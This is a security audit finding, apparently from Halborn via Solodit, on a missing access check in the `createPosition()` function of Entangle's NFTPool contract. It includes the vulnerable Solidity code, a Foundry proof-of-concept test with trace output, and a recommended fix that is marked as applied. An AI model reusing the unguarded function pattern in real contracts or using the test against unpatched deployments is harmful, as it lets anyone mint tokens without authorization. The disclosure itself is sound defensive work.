---
# Core Classification
protocol: Gorples EVM
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 51291
audit_firm: Halborn
contest_link: https://www.halborn.com/audits/entangle-labs/gorples-evm
source_link: https://www.halborn.com/audits/entangle-labs/gorples-evm
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Halborn
---

## Vulnerability Title

Lack of Authorization in createPosition()

### Overview


The NFTPool contract has a security issue where the `createPosition()` function can be accessed by anyone, allowing them to mint NFTPool tokens without proper authorization. This poses a significant risk to the integrity and value of the NFTPool ecosystem. A proof of concept test was used to demonstrate the issue, and it was recommended that an authorization mechanism be implemented to restrict access to the function. The Entangle team has solved this issue by adding an authorization mechanism within the function.

### Original Finding Content

##### Description

During the security assessment of the NFTPool contract, it was identified that the `createPosition()` function allows any address to initiate a staking position, leading to the unintended minting of NFTPool tokens. This issue arises because there is currently no access control mechanism in place, permitting unauthorized parties to call this function and generate NFTPool tokens at will. The absence of proper authorization introduces a significant security risk, potentially impacting the integrity and value of the NFTPool ecosystem.

```
function createPosition(uint256 amount, address receiver) external nonReentrant {
  _updatePool();

  if (amount == 0) {
    revert NFTPool__E4();
  }
  amount = _transferThere(cdt, msg.sender, amount);
```

Given that the rest of the functions in the contract include an authorization mechanism ensuring that only the Gateway contract or the owner of the referenced NFT can call them, it was confirmed with the Entangle team that `createPosition()` should indeed be protected to ensure only the Gateway contract can invoke it.

##### Proof of Concept

The following `Foundry` test was used to prove the aforementioned issue:

```
function testcreatePosition() public {
    vm.expectRevert(MasterBorpa.MasterBorpa__E3.selector);
    nftPool.createPosition(0, address(this));

    // Needs to add the pool to the master borpa
    masterBorpa.add(address(nftPool), 100);

    vm.expectRevert(NFTPool.NFTPool__E4.selector);
    nftPool.createPosition(0, address(this));

    mockERC20.approve(address(nftPool), 1);
    nftPool.createPosition(1, address(this));
}
```

To run it, just execute the following `forge` command:

```
forge test  --mt testcreatePosition -vvvvvv
```

Observe that the test allows anyone with CDT (mockERC20 in the example) to call `createPosition()`:

```
...
  [499215] NFTPoolTest::testcreatePosition()
...
    ├─ [241328] NFTPool::createPosition(1, NFTPoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [1234] MasterBorpa::claimRewards()
    │   │   └─ ← [Return] 0
    │   ├─ emit PoolUpdated(lastRewardBlock: 1, accRewardsPerShare: 0)
    │   ├─ [30220] ERC20Mintable::transferFrom(NFTPoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], NFTPool: [0xA3CE162A39eb1954b41B6aeac19C4198D99AaB4D], 1)
    │   │   ├─ emit Transfer(from: NFTPoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NFTPool: [0xA3CE162A39eb1954b41B6aeac19C4198D99AaB4D], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [530] ERC20Mintable::balanceOf(NFTPool: [0xA3CE162A39eb1954b41B6aeac19C4198D99AaB4D]) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: NFTPoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1)
    │   ├─ [406] NFTPoolTest::onERC721Received(NFTPoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1, 0x)
    │   │   └─ ← [Return] 0x150b7a0200000000000000000000000000000000000000000000000000000000
    │   ├─ emit CreatePosition(tokenId: 1, amount: 1)
    │   └─ ← [Stop] 
    └─ ← [Return] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.29ms (546.25µs CPU time)

Ran 1 test suite in 922.05ms (8.29ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

##### BVSS

[AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5)](/bvss?q=AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U)

##### Recommendation

To mitigate this issue effectively, it is strongly advised to implement an authorization mechanism within the `createPosition()` function. This mechanism should restrict access so that only authorized contracts, specifically the Gateway contract, can invoke `createPosition()`.

### Remediation Plan

**SOLVED:** The **Entangle team** solved this issue as recommended.

##### Remediation Hash

<https://github.com/Entangle-Protocol/borpa/commit/507d7fe087696379a35b46426863812b1c7cfc6f>

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Halborn |
| Protocol | Gorples EVM |
| Report Date | N/A |
| Finders | Halborn |

### Source Links

- **Source**: https://www.halborn.com/audits/entangle-labs/gorples-evm
- **GitHub**: N/A
- **Contest**: https://www.halborn.com/audits/entangle-labs/gorples-evm

### Keywords for Search

`vulnerability`

